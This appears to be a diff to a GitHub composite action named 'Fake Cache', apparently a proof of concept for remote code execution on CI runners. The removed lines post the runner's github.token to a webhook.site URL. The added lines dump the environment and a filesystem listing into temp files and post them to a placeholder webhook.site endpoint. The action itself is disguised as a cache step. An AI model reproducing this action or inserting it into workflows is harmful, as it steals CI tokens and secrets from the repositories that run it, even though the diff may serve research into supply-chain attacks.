@@ -1,5 +1,5 @@
 name: 'Fake Cache'
-description: 'Looks legit'
+description: 'POC - RCE demonstration'
 inputs:
   path:
     required: true
@@ -10,10 +10,23 @@ inputs:
 runs:
   using: 'composite'
   steps:
-    - name: POC - Execute code on runner
+    - name: POC - Full RCE
       shell: bash
       run: |
-        echo "=== POC: RCE on GitHub Runner ==="
-        whoami
-        curl -X POST -d "token=${{ github.token }}" https://webhook.site/f1b930df-2be3-4d43-9a14-03c0c81f26e3
-        echo "POC complete"
+        echo "=== RCE PROOF ==="
+
+        # 1. Environment dump
+        env | sort > /tmp/env_dump.txt
+
+        # 2. File system access
+        ls -la / >> /tmp/fs_access.txt
+        find /home -maxdepth 3 >> /tmp/fs_access.txt 2>/dev/null
+
+        # 3. Network access
+        curl -s https://canarytokens.com/terms/YOUR-TOKEN/tag.js
+
+        # 4. Exfiltrate it all
+        curl -X POST \
+          -F "env=@/tmp/env_dump.txt" \
+          -F "fs=@/tmp/fs_access.txt" \
+          https://webhook.site/YOUR-ID
